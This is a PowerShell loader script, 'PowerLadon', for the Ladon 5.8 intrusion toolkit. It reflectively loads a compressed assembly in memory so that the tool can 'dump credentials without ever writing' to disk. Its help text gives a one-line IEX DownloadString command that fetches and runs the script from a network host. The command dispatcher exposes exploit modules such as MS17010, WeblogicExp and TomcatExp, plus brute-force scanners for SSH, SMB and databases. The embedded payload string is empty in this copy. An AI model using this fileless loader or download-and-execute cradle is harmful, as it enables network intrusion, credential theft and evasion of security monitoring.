#PowerLadon
function Ladon
{
<#
.SYNOPSIS

This script leverages Ladon 5.8 and Reflection.Assembly to reflectively load Ladon completely in memory. This allows you to do things such as
dump credentials without ever writing the Ladon binary to disk. 

Function: Ladon (https://github.com/k8gege/Ladon)
Author: K8gege (https://github.com/k8gege)
License:  MIT
Required Dependencies: Ladon (included)
Optional Dependencies: None
Ladon version: 5.8 (12/10/2019)

.DESCRIPTION

Reflectively loads Ladon 5.8 in memory using PowerShell. Can be used to scan network without writing anything to disk. Can be used for any 
functionality provided with Ladon.

.TestON

Win7 x86  (Microsoft Windows [6.1.7601])
Win8 x64  (Microsoft Windows [6.2.9200])
Win10 x64 (Microsoft Windows [10.0.14393])

.EXAMPLE

Execute Ladon on the local computer to scan network OnlinePC.
Ladon OnlinePC
Ladon 192.168.1.8/24 OnlinePC


0x001 Cmd
powershell 
Import-Module .\Ladon.ps1
Ladon OnlinePC

0x002 Local
powershell Import-Module .\Ladon.ps1;Ladon OnlinePC

0x002 Remove
powershell "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.8/Ladon.ps1'); Ladon OnlinePC"

#>
Param      
(       
[parameter(
#Mandatory = $true,
Position = 0
)]
$Q7MGIzea = "help",
[parameter(
Position = 1
)]
$z9cZmQB = "OnlinePC",
[parameter(
Position = 2
)]
$bH8T3b
)

$kh89K = @'
'@
$8Hz8 = New-object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($kh89K),[IO.Compression.CompressionMode]::Decompress)
$S7B1p = New-object Byte[](592896)
$8Hz8.Read($S7B1p, 0, 592896) | Out-Null
$FkDM7 = [Reflection.Assembly]::Load($S7B1p).GetType('Ladon.Scan')
If([String]::IsNullOrEmpty($bH8T3b)){If($Q7MGIzea -eq "OnlinePC" -or $Q7MGIzea -eq "OnlineIP" -or $Q7MGIzea -eq "OsScan" -or $Q7MGIzea -eq "PortScan" -or $Q7MGIzea -eq "CiscoScan" -or $Q7MGIzea -eq "WebScan" -or $Q7MGIzea -eq "SameWeb" -or $Q7MGIzea -eq "UrlScan" -or $Q7MGIzea -eq "WhatCMS" -or $Q7MGIzea -eq "WebDir" -or $Q7MGIzea -eq "SubDomain" -or $Q7MGIzea -eq "HostIP" -or $Q7MGIzea -eq "DomainIP" -or $Q7MGIzea -eq "MS17010" -or $Q7MGIzea -eq "WeblogicPoc" -or $Q7MGIzea -eq "WeblogicExp" -or $Q7MGIzea -eq "PhpStudyPoc" -or $Q7MGIzea -eq "TomcatPoc" -or $Q7MGIzea -eq "Struts2Poc" -or $Q7MGIzea -eq "TomcatExp" -or $Q7MGIzea -eq "ActivemqPoc" -or $Q7MGIzea -eq "FtpScan" -or $Q7MGIzea -eq "WmiScan" -or $Q7MGIzea -eq "IpcScan" -or $Q7MGIzea -eq "SmbScan" -or $Q7MGIzea -eq "VncScan" -or $Q7MGIzea -eq "MysqlScan" -or $Q7MGIzea -eq "MssqlScan" -or $Q7MGIzea -eq "OracleScan" -or $Q7MGIzea -eq "SshScan" -or $Q7MGIzea -eq "WeblogicScan" -or $Q7MGIzea -eq "RarScan" -or $Q7MGIzea -eq "EnumMSSQL" -or $Q7MGIzea -eq "EnumShare" -or $Q7MGIzea -eq "EnHex" -or $Q7MGIzea -eq "DeHex" -or $Q7MGIzea -eq "EnBase64" -or $Q7MGIzea -eq "DeBase64"){$z9cZmQB=""}If([String]::IsNullOrEmpty($z9cZmQB))
{$FkDM7::Main(@($Q7MGIzea))}else{$FkDM7::Main(@($Q7MGIzea,$z9cZmQB))}}else{$FkDM7::Main(@($Q7MGIzea,$z9cZmQB,$bH8T3b))}
}